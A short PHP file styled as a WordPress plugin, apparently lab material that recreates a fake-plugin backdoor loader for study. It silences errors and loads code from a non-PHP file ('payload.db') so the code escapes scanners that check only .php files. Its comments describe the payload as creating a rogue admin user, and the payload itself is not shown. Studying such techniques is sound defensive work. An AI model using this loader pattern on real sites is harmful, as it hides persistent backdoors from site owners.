<?php
/**
 * Plugin Name: ZZ Demo Shell (BENIGNO - material de estudo)
 * Description: Reproduz a ESTRUTURA do backdoor "fake plugin + include" para
 *   fins de laboratório. NÃO é malware: o payload só cria um usuário rotulado
 *   'demo_rogue_admin' num banco descartável e escreve um arquivo-evidência,
 *   para você OBSERVAR a técnica. Não contém shell, nem recebe comandos.
 * Version: 0.0-lab
 * Author: wp-threat-kit
 */

// Mesmos "silenciadores" que o malware real usa — aqui só para fidelidade didática.
error_reporting(0);
ignore_user_abort(true);

// A jogada central da família: o código vive num arquivo de extensão não-php,
// incluído como PHP. É isso que escapa de scanner que só olha *.php.
include __DIR__ . '/payload.db';
